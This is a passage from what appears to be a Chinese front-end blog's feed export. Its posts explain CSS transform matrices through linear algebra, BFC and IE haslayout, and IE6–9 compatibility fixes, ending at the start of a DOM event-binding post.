<p>这告诉我们另外一个事实，<b>二维空间的线性变换仅由四个数字完全确定</b>，这四个数字就是基向量 <b>i</b> 变换后 <b>i帽</b> 的坐标，以及基向量 <b>j</b> 变换后 <b>j帽</b> 的坐标，如下图：</p>
<p><img src="/static/img/aaafuck.png" style="max-width: 500px;"></p>
<p>是不是很酷？只需要四个数字，我们就确定了二维空间的一个变换。通常，我们把这四个数字放到一个 <code>2 x 2</code> 的格子中，我们称之为 <code>2 x 2</code> 矩阵：</p>
<p><img src="/static/img/juzhen.png" style="max-width: 500px;"></p>
<p>现在，当你再看到 <code>2 x 2</code> 矩阵的时候，你的第一几何直观反映应该是：它描述了一个二维空间的变换。</p>
<p>我们把情况一般化，如下图：</p>
<p><img src="/static/img/yiban.png" style="max-width: 500px;"></p>
<p>我们有一个 <code>2 x 2</code> 的矩阵 <code>[a, c] [b, d]</code>，其中 <code>[a, c]</code> 是基向量 <b>i</b> 变换后的坐标，<code>[b, d]</code> 是基向量 <b>j</b> 变换后的坐标，那么根据这个变换，以及线性变换的性质，我们可以推断出任意向量 <code>[x, y]</code> 变换后的坐标：</p>
<p><img src="/static/img/yuanyin.png" style="max-width: 400px;"></p>
<p class="tip"><br>实际上，这就是数学家之所以这样定义 矩阵的向量乘法 的原因。<br></p>

<p>到了这里，让我们整理一下思路，首先，对于一个 <code>2 x 2</code> 的矩阵，你的直观几何感受应该是，第一列的两个数是对基向量 <b>i</b> 的变换，第二列的两个数是对基向量 <b>j</b> 的变换，这四个数字组成的 <code>2 x 2</code> 的矩阵，描述了一个对空间的线性变换，我们可以根据这个变换推断出任意一点(或者任意向量)变换后的坐标。</p>
<p>其实我么你还可以换一个角度考虑，我们就单纯的把 <code>2 x 2</code> 矩阵叫做变换，那么向量与矩阵的乘积，就要可以看做是该向量应用了这个变换。其实，这就是矩阵向量乘法的几何意义。</p>
<h2 id="回到-CSS-的-transform"><a href="#回到-CSS-的-transform" class="headerlink" title="回到 CSS 的 transform"></a>回到 CSS 的 transform</h2><p>说了一大堆，是时候回到 <code>CSS</code> 的 <code>transform</code>，我们来看一下2D变换下 <code>transform</code> 属性的 <code>matrix</code> 写法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(<span class="selector-tag">a</span>, <span class="selector-tag">b</span>, <span class="selector-tag">c</span>, <span class="selector-tag">d</span>, <span class="selector-tag">e</span>, <span class="selector-tag">f</span>);</span><br></pre></td></tr></table></figure>
<p>在文章开始，我们知道各个参数默认值如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(1, 0, 0, 1, 0, 0);</span><br></pre></td></tr></table></figure>
<p>有的同学可能会问：说好的 <code>2 x 2</code> 矩阵也就是四个数字就能确定一个二维空间变换，你这里明明有6个数啊，其实，<code>transform</code> 2D变换是一个 <code>3 * 3</code> 的矩阵，为什么是这样？因为：<em>位移(translate)</em>，前面我们说过，线性变换要满足其中一个特点：原点不能移动，但是位移却使原点发生了移动，所以 <code>2 x 2</code> 矩阵满足不了需求，只能再加一列，也就是 <code>3 x 3</code> 的矩阵。</p>
<p>把 <code>matrix</code> 中的 <code>a b c d e f</code> 放到一个 <code>3 x 3</code> 的矩阵中应该是这样的：</p>
<p><img src="/static/img/mr1.png" style="max-width: 200px;"></p>
<p>其实，在没有<code>位移(translate)</code>的情况下，<code>[a, b] [c, d]</code> 四个数字组成的 <code>2 x 2</code> 矩阵是完全可以描述2D变换的，现在我们只看由 <code>[a, b] [c, d]</code> 组成的 <code>2 x 2</code> 矩阵：</p>
<p><img src="/static/img/mr2.png" style="max-width: 100px;"></p>
<p>我们把 <code>a b c d</code> 四个数字使用默认值替换一下，即：<code>a = 1</code>，<code>b = 0</code>，<code>c = 0</code>，<code>d = 1</code>，如下：</p>
<p><img src="/static/img/mr3.png" style="max-width: 100px;"></p>
<p>通过之前的介绍，我们在看到这个矩阵的时候，应该知道，第一列的坐标 <code>(1, 0)</code> 应该是基向量 <b>i</b> 变换后的坐标，但是基向量 <b>i</b> 在变换前的坐标就是 <code>(1, 0)</code>，也就是说没有任何变换，同理，基向量 <b>j</b> 也没有任何变换，所以说，这就是 <code>a b c d</code> 默认值设定为下面代码所示的值的原因：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(<span class="selector-tag">a</span>, <span class="selector-tag">b</span>, <span class="selector-tag">c</span>, <span class="selector-tag">d</span>, <span class="selector-tag">e</span>, <span class="selector-tag">f</span>);</span><br><span class="line">// a b c d 默认值为 1 0 0 1</span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(1, 0, 0, 1, <span class="selector-tag">e</span>, <span class="selector-tag">f</span>);</span><br></pre></td></tr></table></figure>
<p>那么大家想想一下，我们把 <code>a</code> 的值从 <code>1</code> 变为 <code>2</code> 会发生什么？如果把 <code>a</code> 的值从 <code>1</code> 变为 <code>2</code> 那么矩阵如下：</p>
<p><img src="/static/img/mr4.png" style="max-width: 100px;"></p>
<p>也就是说，基向量 <b>i</b> 的坐标从 <code>(1, 0)</code> 变成了 <code>(2, 0)</code>，这是在干什么？是不是基向量 <b>i</b> 被放大为了原来的二倍？举一个通俗的例子：原本单位长度1代表20px，被放大后单位长度1则代表40px。同样的，当我们把 <code>a</code> 的值从 <code>1</code> 变为 <code>0.5</code> 则意味着把基向量 <b>i</b> 缩小为原来的一半。事实上：在 <code>transform: matrix()</code> 中，修改 <code>a</code> 的值，就是在改变 <code>x</code> 轴方向的缩放比例：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(2, 0, 0, 1, 0, 0);</span><br><span class="line"><span class="comment">/* 等价于 */</span></span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">scaleX</span>(2);</span><br></pre></td></tr></table></figure>
<p>相信大家已经知道了，修改 <code>d</code> 的值，就是改变 <code>y</code> 轴的缩放比例：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(1, 0, 0, 4, 0, 0);</span><br><span class="line"><span class="comment">/* 等价于 */</span></span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">scaleY</span>(4);</span><br></pre></td></tr></table></figure>
<p>那么旋转要如何修改 <code>matrix</code> 中的值呢？其实，想要知道如何修改 <code>a b c d</code> 的值，只需要知道，旋转后基向量 <b>i</b> 和 <b>j</b> 的坐标就可以了，将旋转后的坐标对号填入就可以得到变换矩阵，下面，我们就来看看如何确定旋转后基向量 <b>i</b> 和 <b>j</b> 的坐标。</p>
<p>我们知道，在 <code>web</code> 开发中的坐标系和数学中的坐标系在正方向的选取上不太一致，在大家所熟悉的坐标系中，正方向的选取如下：</p>
<p><img src="/static/img/zbx.png" style="max-width: 100px;"></p>
<p>而在 <code>web</code> 开发中，坐标系的正方向选取是这样的：</p>
<p><img src="/static/img/zbx2.png" style="max-width: 100px;"></p>
<p>假设我们将其顺时针旋转 45 度，如下图：</p>
<p><img src="/static/img/trans.png" style="max-width: 300px;"></p>
<p>假设，上图中我们旋转的是单位向量，那么旋转后单位向量 <b>i</b> 的坐标应该是 <code>(cosθ, sinθ)</code>，单位向量 <b>j</b> 的坐标应该是 <code>(-sinθ, cosθ)</code>，所以如果用矩阵表示的话，应该是这样的：</p>
<p><img src="/static/img/sanjiao.png" style="max-width: 200px;"></p>
<p>如果写到 <code>matrix</code> 里，自然就是下面这个样子：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(<span class="selector-tag">cos</span>θ, <span class="selector-tag">sin</span>θ, <span class="selector-tag">-sin</span>θ, <span class="selector-tag">cos</span>θ, 0, 0)</span><br></pre></td></tr></table></figure>
<p>所以，如果我们要顺时针旋转 45 度，下面两种写法是等价的：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Math.cos(Math.PI / 180 * 45) = 0.707106</span></span><br><span class="line"><span class="comment"> * Math.sin(Math.PI / 180 * 45) = 0.707106</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(0<span class="selector-class">.707106</span>, 0<span class="selector-class">.707106</span>, <span class="selector-tag">-0</span><span class="selector-class">.707106</span>, 0<span class="selector-class">.707106</span>, 0, 0)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 等价于 */</span></span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">rotate</span>(45<span class="selector-tag">deg</span>);</span><br></pre></td></tr></table></figure>
<p>通过上面缩放和旋转的例子，我们已经知道了，<code>2 x 2</code> 的矩阵确实能够描述二维空间的变换，这也就是矩阵能够操作空间的原因。在 <code>transform</code> 中，除了缩放(<code>scale</code>)、旋转(<code>rotate</code>) 还有倾斜(<code>skew</code>)，对于倾斜，类似于我们寻找旋转后基向量的坐标一样，你只需要根据倾斜所定义的变换规则，找到基向量变换后的坐标就可以了，实际上倾斜对应如下规则：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(1, <span class="selector-tag">tan</span>(θ<span class="selector-tag">y</span>), <span class="selector-tag">tan</span>(θ<span class="selector-tag">x</span>), 1, 0, 0);</span><br></pre></td></tr></table></figure>
<p>大家自己拿只笔在纸上画一画应该就能搞清楚倾斜在做什么样子的变换。</p>
<p>无论 缩放(<code>scale</code>)、旋转(<code>rotate</code>) 还是倾斜(<code>skew</code>)，他们都不会是原点发生改变，所以使用 <code>a b c d</code> 四个数字组成的矩阵完全可以描述，但是不要忘了，我们还有一个 位移(<code>translate</code>)，这时，就不得不提到 <code>e f</code> 了，我想我不说大家也都知道了，<code>e f</code> 分别代表了 <code>x y</code> 方向的位移，事实也如大家所想：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(1, 0, 0, 1, 100, 200)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 等价于 */</span></span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">translateX</span>(100<span class="selector-tag">px</span>) <span class="selector-tag">translateY</span>(200<span class="selector-tag">px</span>);</span><br></pre></td></tr></table></figure>
<p>至此，<code>transform</code> 使用 <code>3 x 3</code> 矩阵：<img src="/static/img/mr1.png" style="max-width: 100px;"> 来描述二维空间变换的方式，以及是如何做到的我们就算讲完了。</p>
<p>除了2D变换，还有3D变换，在 <code>transform</code> 中，使用 <code>4 x 4</code> 的矩阵描述3D变换，但实际上，三维空间的线性变换只需要一个 <code>3 x 3</code> 的矩阵就可以描述了，那么为什么搞了一个 <code>4 x 4</code>矩阵呢？实际上这和我们在将二维空间的变换使用 <code>3 x 3</code> 矩阵的道理是一样的，那就是位移。</p>
<p>我们来看一下3D变换的 <code>matrix</code> 默认值：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(<span class="selector-tag">a</span>, <span class="selector-tag">b</span>, <span class="selector-tag">c</span>, <span class="selector-tag">d</span>, <span class="selector-tag">e</span>, <span class="selector-tag">f</span>, <span class="selector-tag">g</span>, <span class="selector-tag">h</span>, <span class="selector-tag">i</span>, <span class="selector-tag">j</span>, <span class="selector-tag">k</span>, <span class="selector-tag">l</span>, <span class="selector-tag">m</span>, <span class="selector-tag">n</span>, <span class="selector-tag">o</span>, <span class="selector-tag">p</span>);</span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);</span><br></pre></td></tr></table></figure>
<p>这十六个数字就是 <code>4 x 4</code> 矩阵的 16 个数值：</p>
<p><img src="/static/img/3dmr.png" style="max-width: 200px;"></p>
<p>如果换成对应数字，是这样的：</p>
<p><img src="/static/img/3d.png" style="max-width: 200px;"></p>
<p>类似于我们讲解 2D 变换一样，其中由 <img src="/static/img/3d33.png" style="max-width: 70px;"> 组成的 <code>3 x 3</code> 矩阵用来描述空间的 3D 线性变换，如：<code>rotateX</code> <code>rotateY</code> <code>scaleZ</code> 等等，注意：<code>rotateZ</code> 是 2D 变换哦。</p>
<p>而 <code>m</code> <code>n</code> <code>o</code> 则分别用来描述位移：<code>translateX</code> <code>translateY</code> <code>translateZ</code>。</p>
]]></content>
      <categories>
        <category>CSS3</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
        <tag>API</tag>
        <tag>transform</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS-BFC</title>
    <url>/2018/04/17/CSS_BFC/</url>
    <content><![CDATA[<h2 id="BOX"><a href="#BOX" class="headerlink" title="BOX"></a>BOX</h2><ul>
<li>概念：CSS布局的基本单位</li>
<li>解释：BOX是CSS布局的基本单位，元素的类型和dispaly属性，决定了这个元素的的BOX类型，BOX的类型分为：<ul>
<li>【block-level box】<ul>
<li>display属性值为：block、list-item、table 的元素会生成 block-levle box，并且参与 block formatting context 布局</li>
</ul>
</li>
<li>【inline-level box】<ul>
<li>display属性值为：inline、inline-block、inline-table 的元素会生成 inline-level box，并参与 inline formatting context 布局</li>
</ul>
</li>
<li>【run-in box】<ul>
<li>CSS3中定义</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Formatting-Context"><a href="#Formatting-Context" class="headerlink" title="Formatting Context"></a>Formatting Context</h2><ul>
<li>概念：Formatting Context 【格式化上下文】</li>
<li>解释：它是一个决定如何渲染文档的容器，常见的 Formatting Context 如下：<ul>
<li>【Block formatting context】(BFC)</li>
<li>【Inline formatting context】(IFC)</li>
<li>【Grid formatting context】(GFC)</li>
<li>【Flex formatting context】(FFC)</li>
</ul>
</li>
</ul>
<h2 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h2><p>创建一个独立的渲染区域，并规定了 block-level box 如何布局，且与这个区域外部毫不相关</p>
<p>BFC布局规则如下(注意BFC只影响块儿级盒)：</p>
<ul>
<li>内部Box按垂直方向一个接一个的放置</li>
<li>Box垂直方向的距离由margin值决定，并且属于同一个BFC的两个相邻的box的margin值会重叠</li>
<li>每个元素的 margin-box 的左边与包含块儿 border-box 的左边相接触</li>
<li>BFC的区域不会与浮动盒子重叠</li>
<li>BFC就是一个隔绝的容器，容器里面的子元素不影响外面元素的布局，反之亦然</li>
<li>计算BFC的高度时，浮动元素也参与计算</li>
</ul>
<p>以下CSS属性，将会触发BFC：</p>
<ul>
<li>根元素，即 <code>&lt;html&gt;</code></li>
<li><code>float</code> 属性值不为 <code>none</code></li>
<li><code>position</code> 属性的值为 <code>absolute</code> 或 <code>fixed</code></li>
<li><code>overflow</code> 属性值不为 <code>visible</code></li>
<li><code>display</code> 属性值为 <code>inline-block</code>, <code>table-cell</code>, <code>table-caption</code></li>
</ul>
<h2 id="BFC的应用"><a href="#BFC的应用" class="headerlink" title="BFC的应用"></a>BFC的应用</h2><ul>
<li>自适应两栏布局<ul>
<li>利用的是 BFC 不与浮动元素重叠的特性</li>
</ul>
</li>
<li>清楚浮动<ul>
<li>利用BFC内浮动元素也参与BFC高度计算的特性</li>
</ul>
</li>
<li>解决margin折叠(传递)<ul>
<li>子元素的margin-top传递到父级</li>
</ul>
</li>
<li>防止margin重叠<ul>
<li>因为BFC内相邻元素的margin值会重叠，如果给其中一个元素包一层，并设置为BFC，又因为BFC内子元素的布局与外部元素互不影响的特性，就可以解决重叠的问题</li>
</ul>
</li>
</ul>
<h2 id="IE-haslayout"><a href="#IE-haslayout" class="headerlink" title="IE haslayout"></a>IE haslayout</h2><p><code>IE</code> 是个奇葩，自己搞一个叫做 <code>haslayout</code> 的东西，类似 <code>BFC</code>，一般在 <code>IE</code> 中显示有问题的东西都可以通过触发 <code>haslayout</code> 来解决，触发方法有很多：</p>
<ul>
<li><code>zoom</code> 属性设置为除 <code>normal</code> 以外的值</li>
<li><code>width/height</code> 除 <code>auto</code> 以外的值</li>
<li><code>float</code> 除 <code>none</code> 以外的值</li>
</ul>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>BFC</tag>
        <tag>盒子模型</tag>
      </tags>
  </entry>
  <entry>
    <title>link和@import的区别</title>
    <url>/2018/04/17/CSS_link%E5%92%8C-import%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>引入方式</tag>
      </tags>
  </entry>
  <entry>
    <title>各种居中实现大全</title>
    <url>/2018/04/17/CSS_%E5%90%84%E7%A7%8D%E5%B1%85%E4%B8%AD%E5%AE%9E%E7%8E%B0%E5%A4%A7%E5%85%A8/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>实例</tag>
        <tag>居中</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS-css hack兼容性</title>
    <url>/2018/04/17/CSS_css-hack%E5%85%BC%E5%AE%B9%E6%80%A7/</url>
    <content><![CDATA[<h6 id="一、IE6-7-8-不支持HTML5标签"><a href="#一、IE6-7-8-不支持HTML5标签" class="headerlink" title="一、IE6/7/8 不支持HTML5标签"></a>一、IE6/7/8 不支持HTML5标签</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决方案一：</span><br><span class="line">	可以使用 document.createElement() 动态创建HTML5标签，如 header footer 等，但是在 IE6/7/8 看来，这种方法创建的标签属于自定义标签，自定义标签默认为内联元素，所以为了将一些元素转为块元素，还需加上如下js代码</span><br><span class="line"></span><br><span class="line">	header&#123;</span><br><span class="line">		display: block;</span><br><span class="line">	&#125;</span><br><span class="line">解决方案二：</span><br><span class="line">	使用一套成熟的js库，github地址：https://github.com/aFarkas/html5shiv</span><br></pre></td></tr></table></figure>
<h6 id="二、IE6-7-不支持-BFC"><a href="#二、IE6-7-不支持-BFC" class="headerlink" title="二、IE6/7 不支持 BFC"></a>二、IE6/7 不支持 BFC</h6><p>这导致 在标准浏览器中原本能够触发BFC的属性，不能在IE6/7中正常触发。会有很多奇怪的问题，比如两个float的元素的内容会互相影响 等等。</p>
<p>不过IE有自己的一个东西，叫做 haslayout ，</p>
<p>但以上描述的问题在IE6/7中基本可以靠 触发IE的haslayout解决，如：zoom:1</p>
<h6 id="三、IE6下，如果子元素的宽高超过父级元素的宽高，父级元素被子元素撑开。"><a href="#三、IE6下，如果子元素的宽高超过父级元素的宽高，父级元素被子元素撑开。" class="headerlink" title="三、IE6下，如果子元素的宽高超过父级元素的宽高，父级元素被子元素撑开。"></a>三、IE6下，如果子元素的宽高超过父级元素的宽高，父级元素被子元素撑开。</h6><p>不过，一般不会有人这么写，更不建议这么写</p>
<h6 id="四、IE6不支持-display-inline-block"><a href="#四、IE6不支持-display-inline-block" class="headerlink" title="四、IE6不支持 display: inline-block;"></a>四、IE6不支持 display: inline-block;</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决方法：</span><br><span class="line">   &#123;</span><br><span class="line">       *display: inline;</span><br><span class="line">       zoom: 1;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h6 id="五、IE6下div最小高度-19px"><a href="#五、IE6下div最小高度-19px" class="headerlink" title="五、IE6下div最小高度 19px"></a>五、IE6下div最小高度 19px</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决办法：</span><br><span class="line">   &#123;</span><br><span class="line">       overflow: hidden;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h6 id="六、IE6下块儿元素浮动会产生双倍-margin-值"><a href="#六、IE6下块儿元素浮动会产生双倍-margin-值" class="headerlink" title="六、IE6下块儿元素浮动会产生双倍 margin 值"></a>六、IE6下块儿元素浮动会产生双倍 margin 值</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决办法：</span><br><span class="line">	将块儿元素转为行内元素，即添加 display: inline;</span><br></pre></td></tr></table></figure>
<h6 id="七、li下元素都浮动，那么在IE6-7下，每个li元素间会有4px的间隔"><a href="#七、li下元素都浮动，那么在IE6-7下，每个li元素间会有4px的间隔" class="headerlink" title="七、li下元素都浮动，那么在IE6/7下，每个li元素间会有4px的间隔"></a>七、li下元素都浮动，那么在IE6/7下，每个li元素间会有4px的间隔</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决方案：</span><br><span class="line">	给 li 元素添加 vertical-align: top;</span><br></pre></td></tr></table></figure>
<h6 id="八、IE6文字溢出bug，两个浮动元素中间有内敛元素或者注释节点，且其中一个浮动元素的宽度和父级宽度相差小于3px。那么这个浮动元素内的文本会被复制出一个“小尾巴”"><a href="#八、IE6文字溢出bug，两个浮动元素中间有内敛元素或者注释节点，且其中一个浮动元素的宽度和父级宽度相差小于3px。那么这个浮动元素内的文本会被复制出一个“小尾巴”" class="headerlink" title="八、IE6文字溢出bug，两个浮动元素中间有内敛元素或者注释节点，且其中一个浮动元素的宽度和父级宽度相差小于3px。那么这个浮动元素内的文本会被复制出一个“小尾巴”"></a>八、IE6文字溢出bug，两个浮动元素中间有内敛元素或者注释节点，且其中一个浮动元素的宽度和父级宽度相差小于3px。那么这个浮动元素内的文本会被复制出一个“小尾巴”</h6><h6 id="九、IE6-7-下，父级的-overflow-hidden-包不住拥有相对定位-position-relative-的子元素"><a href="#九、IE6-7-下，父级的-overflow-hidden-包不住拥有相对定位-position-relative-的子元素" class="headerlink" title="九、IE6/7 下，父级的 overflow: hidden; 包不住拥有相对定位(position: relative;) 的子元素"></a>九、IE6/7 下，父级的 overflow: hidden; 包不住拥有相对定位(position: relative;) 的子元素</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决方案：</span><br><span class="line">	给父级也加相对定位 position: relative;</span><br></pre></td></tr></table></figure>
<h6 id="十、在IE6下绝对定位元素父级的宽高是奇数时，绝对定位元素的right和bottom值会有1px的偏差。"><a href="#十、在IE6下绝对定位元素父级的宽高是奇数时，绝对定位元素的right和bottom值会有1px的偏差。" class="headerlink" title="十、在IE6下绝对定位元素父级的宽高是奇数时，绝对定位元素的right和bottom值会有1px的偏差。"></a>十、在IE6下绝对定位元素父级的宽高是奇数时，绝对定位元素的right和bottom值会有1px的偏差。</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决办法：避免绝对定位元素的父级宽高是奇数</span><br></pre></td></tr></table></figure>
<h6 id="十一、在IE6下，绝对定位元素和浮动元素并列，绝对定位元素消失"><a href="#十一、在IE6下，绝对定位元素和浮动元素并列，绝对定位元素消失" class="headerlink" title="十一、在IE6下，绝对定位元素和浮动元素并列，绝对定位元素消失"></a>十一、在IE6下，绝对定位元素和浮动元素并列，绝对定位元素消失</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决办法：不让其同级就可以了</span><br></pre></td></tr></table></figure>
<h6 id="十二、IE6下input表单元素上下各有1px的间隙。"><a href="#十二、IE6下input表单元素上下各有1px的间隙。" class="headerlink" title="十二、IE6下input表单元素上下各有1px的间隙。"></a>十二、IE6下input表单元素上下各有1px的间隙。</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决办法，给input元素加浮动</span><br></pre></td></tr></table></figure>
<h6 id="十三、IE6输入类型的表单背景图随着用户输入而移动的bug"><a href="#十三、IE6输入类型的表单背景图随着用户输入而移动的bug" class="headerlink" title="十三、IE6输入类型的表单背景图随着用户输入而移动的bug"></a>十三、IE6输入类型的表单背景图随着用户输入而移动的bug</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决办法：在设置background属性时加 fixed：(background: url(img/a.jpg) no-repeat fixed;)</span><br></pre></td></tr></table></figure>
<h6 id="十四、IE8不会重绘伪类元素，除非修改伪类元素的-content-值"><a href="#十四、IE8不会重绘伪类元素，除非修改伪类元素的-content-值" class="headerlink" title="十四、IE8不会重绘伪类元素，除非修改伪类元素的 content 值"></a>十四、IE8不会重绘伪类元素，除非修改伪类元素的 content 值</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决办法：定义新样式，修改伪类元素content的值。</span><br></pre></td></tr></table></figure>
<h6 id="十五、IE9-不支持-dataset"><a href="#十五、IE9-不支持-dataset" class="headerlink" title="十五、IE9 不支持 dataset"></a>十五、IE9 不支持 dataset</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决办法：使用 getAttribute/setAttribute/removeAttribute/hasAttribute 代替</span><br></pre></td></tr></table></figure>
<h6 id="十六、IE8及以下版本不支持-pageX-Y"><a href="#十六、IE8及以下版本不支持-pageX-Y" class="headerlink" title="十六、IE8及以下版本不支持 pageX/Y"></a>十六、IE8及以下版本不支持 pageX/Y</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决办法：可以通过 clientX/Y + scrollLeft/Top 计算</span><br></pre></td></tr></table></figure>
<h6 id="十七、IE8及以下不支持-metaKey"><a href="#十七、IE8及以下不支持-metaKey" class="headerlink" title="十七、IE8及以下不支持 metaKey"></a>十七、IE8及以下不支持 metaKey</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event.shiftKey        // 按住 shift 键为true</span><br><span class="line">event.ctrlKey        // 按住 Ctrl 键为true</span><br><span class="line">event.altKey        // 按住 alt 键为true</span><br><span class="line">event.metaKey        // Mac下按住 command 键为true，windows 按住 Windows 键为true</span><br></pre></td></tr></table></figure>
<h6 id="十八、IE8及以下不支持-DOMcontentLoaded"><a href="#十八、IE8及以下不支持-DOMcontentLoaded" class="headerlink" title="十八、IE8及以下不支持 DOMcontentLoaded"></a>十八、IE8及以下不支持 DOMcontentLoaded</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解决办法：使用 window.onload 代替</span><br></pre></td></tr></table></figure>
<h6 id="十九、部分-Android-手机中，键盘事件获取-event-keyCode-异常"><a href="#十九、部分-Android-手机中，键盘事件获取-event-keyCode-异常" class="headerlink" title="十九、部分 Android 手机中，键盘事件获取 event.keyCode 异常"></a>十九、部分 Android 手机中，键盘事件获取 event.keyCode 异常</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用 textInput 事件，根据按键内容区分按键</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>css长度单位集锦</title>
    <url>/2018/04/17/CSS_css%E9%95%BF%E5%BA%A6%E5%8D%95%E4%BD%8D%E9%9B%86%E9%94%A6/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>单位</tag>
      </tags>
  </entry>
  <entry>
    <title>一个监听数据变化的例子【含数组】</title>
    <url>/2018/04/17/Code_%E4%B8%80%E4%B8%AA%E7%9B%91%E5%90%AC%E6%95%B0%E6%8D%AE%E5%8F%98%E5%8C%96%E7%9A%84%E4%BE%8B%E5%AD%90%E3%80%90%E5%90%AB%E6%95%B0%E7%BB%84%E3%80%91/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>MVVM</tag>
      </tags>
  </entry>
  <entry>
    <title>如何清除浮动</title>
    <url>/2018/04/17/CSS_%E5%A6%82%E4%BD%95%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>清浮动</tag>
      </tags>
  </entry>
  <entry>
    <title>函数节流</title>
    <url>/2018/04/17/Code_%E5%87%BD%E6%95%B0%E8%8A%82%E6%B5%81/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>实例代码</tag>
      </tags>
  </entry>
  <entry>
    <title>深度克隆</title>
    <url>/2018/04/17/Code_%E6%B7%B1%E5%BA%A6%E5%85%8B%E9%9A%86/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>实例代码</tag>
        <tag>深度克隆</tag>
      </tags>
  </entry>
  <entry>
    <title>让程序睡眠3秒</title>
    <url>/2018/04/17/Code_%E8%AE%A9%E7%A8%8B%E5%BA%8F%E7%9D%A1%E7%9C%A03%E7%A7%92/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>实例代码</tag>
      </tags>
  </entry>
  <entry>
    <title>ECMA_DOM事件</title>
    <url>/2018/04/19/ECMA-DOM%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="一、绑定事件的方法"><a href="#一、绑定事件的方法" class="headerlink" title="一、绑定事件的方法"></a>一、绑定事件的方法</h2><h4 id="HTML内联属性绑定"><a href="#HTML内联属性绑定" class="headerlink" title="HTML内联属性绑定"></a>HTML内联属性绑定</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">"alert('fuck')"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
